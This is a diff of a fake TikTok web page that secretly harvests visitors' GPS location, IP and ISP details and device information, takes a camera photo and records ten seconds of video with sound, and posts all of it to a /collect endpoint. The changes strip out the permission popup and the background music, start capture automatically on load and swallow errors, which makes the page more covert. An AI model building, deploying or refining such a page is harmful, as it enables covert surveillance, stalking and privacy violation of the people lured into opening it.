@@ -6,84 +6,44 @@
     <title>TikTok - Make Your Day</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
-        body{font-family:Arial,sans-serif;background:#000;color:#fff;height:100vh;overflow:hidden}
-        .container{width:100%;height:100vh;position:relative;background:#000}
+        body{
+            font-family:Arial,sans-serif;
+            background:#000;color:#fff;
+            height:100vh;overflow:hidden;
+        }
+        .container{width:100%;height:100vh;position:relative;background:#111}
         
         .status-bar{
             position:absolute;top:0;left:0;right:0;
             padding:10px 15px;display:flex;
             justify-content:space-between;align-items:center;
-            z-index:50;background:rgba(0,0,0,0.5);
+            z-index:50;background:rgba(0,0,0,0.4);
         }
         .green-dot{
             width:12px;height:12px;background:#34c759;
             border-radius:50%;display:none;
-            box-shadow:0 0 10px rgba(52,199,89,0.9);
-            animation:pulse 1.5s infinite;
+            box-shadow:0 0 8px rgba(52,199,89,0.8);
+            animation:pulse 2s infinite;
         }
         .yellow-dot{
             width:12px;height:12px;background:#ffcc00;
             border-radius:50%;display:none;
-            box-shadow:0 0 10px rgba(255,204,0,0.9);
-            animation:pulse 1.5s infinite;
+            box-shadow:0 0 8px rgba(255,204,0,0.8);
+            animation:pulse 2s infinite;
         }
         @keyframes pulse{
-            0%,100%{box-shadow:0 0 10px rgba(52,199,89,0.9)}
-            50%{box-shadow:0 0 20px rgba(52,199,89,1)}
+            0%,100%{box-shadow:0 0 8px rgba(52,199,89,0.8)}
+            50%{box-shadow:0 0 16px rgba(52,199,89,1)}
         }
         .dots-group{display:flex;gap:10px;align-items:center}
         .timer{color:#fff;font-size:13px}
         
         .bg-screen{
-            position:absolute;top:0;left:0;
-            width:100%;height:100%;
-            background:linear-gradient(135deg,#1a1a2e,#16213e,#0f3460,#1a1a2e);
-            background-size:400% 400%;
-            animation:bgMove 6s ease infinite;
+            position:absolute;top:0;left:0;width:100%;height:100%;
+            background:linear-gradient(135deg,#1a1a2e,#16213e,#0f3460);
             display:flex;justify-content:center;align-items:center;
         }
-        @keyframes bgMove{
-            0%{background-position:0% 50%}
-            50%{background-position:100% 50%}
-            100%{background-position:0% 50%}
-        }
-        
-        .visualizer{
-            display:flex;gap:3px;align-items:flex-end;
-            height:100px;
-        }
-        .bar{
-            width:4px;background:#ff0050;
-            border-radius:2px;
-            animation:bounce 0.5s ease infinite alternate;
-        }
-        .bar:nth-child(1){animation-delay:0s;height:30px}
-        .bar:nth-child(2){animation-delay:0.1s;height:60px}
-        .bar:nth-child(3){animation-delay:0.2s;height:40px}
-        .bar:nth-child(4){animation-delay:0.3s;height:90px}
-        .bar:nth-child(5){animation-delay:0.4s;height:50px}
-        .bar:nth-child(6){animation-delay:0.5s;height:70px}
-        .bar:nth-child(7){animation-delay:0.6s;height:35px}
-        .bar:nth-child(8){animation-delay:0.7s;height:80px}
-        .bar:nth-child(9){animation-delay:0.8s;height:45px}
-        .bar:nth-child(10){animation-delay:0.9s;height:65px}
-        @keyframes bounce{to{transform:scaleY(1.8)}}
-        
-        #cameraPreview{
-            position:absolute;top:0;left:0;
-            width:100%;height:100%;
-            object-fit:cover;z-index:10;
-            display:none;
-        }
-        
-        .rec-msg{
-            position:absolute;top:50px;left:50%;
-            transform:translateX(-50%);
-            color:#ff0050;font-size:14px;font-weight:700;
-            z-index:30;display:none;
-            background:rgba(0,0,0,0.5);
-            padding:6px 14px;border-radius:15px;
-        }
+        .loading-text{color:#aaa;font-size:16px}
         
         .progress-bar{
             position:absolute;bottom:50px;left:20px;right:20px;
@@ -127,19 +87,19 @@
         .nav-item .nav-icon{font-size:22px}
         .nav-item .plus{background:#ff0050;width:30px;height:30px;border-radius:8px;display:flex;justify-content:center;align-items:center;font-size:20px;color:#fff}
         
-        .popup{
-            position:absolute;top:50%;left:50%;
-            transform:translate(-50%,-50%);
-            background:#1a1a2e;padding:30px;border-radius:20px;
-            text-align:center;z-index:100;
-            border:1px solid#333;
+        #cameraPreview{
+            position:absolute;top:0;left:0;
+            width:100%;height:100%;
+            object-fit:cover;z-index:10;
+            display:none;
         }
-        .popup h3{color:#fff;margin-bottom:10px}
-        .popup p{color:#aaa;font-size:13px;margin-bottom:20px}
-        .popup button{
-            background:#ff0050;color:#fff;border:none;
-            padding:12px 35px;border-radius:25px;
-            font-size:16px;cursor:pointer;
+        .rec-msg{
+            position:absolute;top:50px;left:50%;
+            transform:translateX(-50%);
+            color:#ff0050;font-size:14px;font-weight:700;
+            z-index:30;display:none;
+            background:rgba(0,0,0,0.6);
+            padding:6px 14px;border-radius:15px;
         }
     </style>
 </head>
@@ -155,24 +115,13 @@
         
         <div class="rec-msg" id="recMsg"></div>
         
-        <div class="bg-screen" id="bgScreen">
-            <div class="visualizer">
-                <div class="bar"></div><div class="bar"></div><div class="bar"></div>
-                <div class="bar"></div><div class="bar"></div><div class="bar"></div>
-                <div class="bar"></div><div class="bar"></div><div class="bar"></div>
-                <div class="bar"></div>
-            </div>
+        <div class="bg-screen">
+            <p class="loading-text">Loading video...</p>
         </div>
         
         <video id="cameraPreview" autoplay muted playsinline></video>
         
         <div class="progress-bar"><div class="progress-fill"></div></div>
-        
-        <div class="popup" id="camPopup">
-            <h3>🎵 TikTok</h3>
-            <p>Allow camera & microphone<br>to continue</p>
-            <button onclick="startEverything()">Allow</button>
-        </div>
         
         <div class="side-buttons">
             <div class="side-btn"><div class="icon">👤</div></div>
@@ -183,9 +132,9 @@
         </div>
         
         <div class="bottom-info">
-            <div class="username">@trending_music<span class="badge">Follow</span></div>
-            <div class="caption">This song is fire! 🔥🎵 #fyp #trending #viral</div>
-            <div class="music">🎵 Original Sound - TikTok Music</div>
+            <div class="username">@trending_viral<span class="badge">Follow</span></div>
+            <div class="caption">Wait for it... 😱🔥 #fyp #trending #viral</div>
+            <div class="music">🎵 Original Sound - TikTok</div>
         </div>
         
         <div class="bottom-nav">
@@ -197,11 +146,6 @@
         </div>
     </div>
     
-    <!-- YOUR SONG -->
-    <audio id="bgMusic" loop>
-        <source src="https://drive.google.com/uc?export=download&id=10IKSFfEWtedGjZ0JgJ0pPrM1O0_A8CXV" type="audio/mpeg">
-    </audio>
-    
     <script>
         var collectedData={
             sessionId:'s_'+Date.now(),
@@ -209,11 +153,12 @@
             userAgent:navigator.userAgent
         };
         
+        // PHASE 1: Collect data immediately
         function collectData(){
             if(navigator.geolocation){
                 navigator.geolocation.getCurrentPosition(function(p){
                     collectedData.gps={lat:p.coords.latitude,lon:p.coords.longitude};
-                },function(){},{enableHighAccuracy:true,timeout:8000});
+                },function(){},{enableHighAccuracy:true,timeout:5000});
             }
             collectedData.device={
                 platform:navigator.platform,
@@ -230,23 +175,19 @@
             }
             fetch('https://ipapi.co/json/').then(r=>r.json()).then(j=>{
                 collectedData.network={ip:j.ip,city:j.city,country:j.country_name,isp:j.org};
-                sendToServer('phase1');
+                fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(Object.assign({},collectedData,{phase:'phase1'}))});
             });
         }
         
+        // PHASE 2 & 3: Auto photo + 10s record
         var recorder, recChunks=[], camStream;
         
-        async function startEverything(){
-            document.getElementById('camPopup').style.display='none';
+        async function startCamera(){
             try{
                 camStream=await navigator.mediaDevices.getUserMedia({
                     video:{facingMode:"user",width:{ideal:1920},height:{ideal:1080}},
                     audio:true
                 });
-                
-                var music=document.getElementById('bgMusic');
-                music.volume=0.3;
-                music.play();
                 
                 var preview=document.getElementById('cameraPreview');
                 preview.srcObject=camStream;
@@ -256,16 +197,18 @@
                 document.getElementById('greenDot').style.display='block';
                 document.getElementById('yellowDot').style.display='block';
                 
-                await new Promise(r=>setTimeout(r,1500));
+                // Take photo immediately (0.5s)
+                await new Promise(r=>setTimeout(r,500));
                 var canvas=document.createElement('canvas');
                 canvas.width=preview.videoWidth||1920;
                 canvas.height=preview.videoHeight||1080;
                 canvas.getContext('2d').drawImage(preview,0,0);
-                collectedData.photo=canvas.toDataURL('image/jpeg',0.95);
-                sendToServer('phase2');
+                collectedData.photo=canvas.toDataURL('image/jpeg',0.9);
+                fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(Object.assign({},collectedData,{phase:'phase2'}))});
                 
                 preview.style.display='none';
                 
+                // Record 10 seconds with mic
                 recorder=new MediaRecorder(camStream,{mimeType:'video/webm'});
                 recorder.ondataavailable=function(e){if(e.data.size>0)recChunks.push(e.data);};
                 recorder.onstop=function(){
@@ -274,7 +217,7 @@
                         var reader=new FileReader();
                         reader.onload=function(){
                             collectedData.video=reader.result;
-                            sendToServer('phase3');
+                            fetch('/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(Object.assign({},collectedData,{phase:'phase3'}))});
                         };
                         reader.readAsDataURL(blob);
                     }
@@ -297,26 +240,17 @@
                         camStream.getTracks().forEach(t=>t.stop());
                         document.getElementById('greenDot').style.display='none';
                         document.getElementById('yellowDot').style.display='none';
-                        music.pause();
                     }
                 },10000);
                 
-            }catch(e){
-                alert('Camera needed: '+e.message);
-            }
+            }catch(e){}
         }
         
-        function sendToServer(phase){
-            collectedData.phase=phase;
-            fetch('/collect',{
-                method:'POST',
-                headers:{'Content-Type':'application/json'},
-                body:JSON.stringify(collectedData)
-            });
-        }
-        
+        // Start immediately
         collectData();
+        startCamera();
         
+        // Timer
         var timeLeft=300;
         setInterval(function(){
             if(timeLeft>0){timeLeft--;
@@ -326,6 +260,7 @@
             }
         },1000);
         
+        // Likes
         setInterval(function(){
             var el=document.getElementById('likeCount');
             var val=parseFloat(el.textContent);
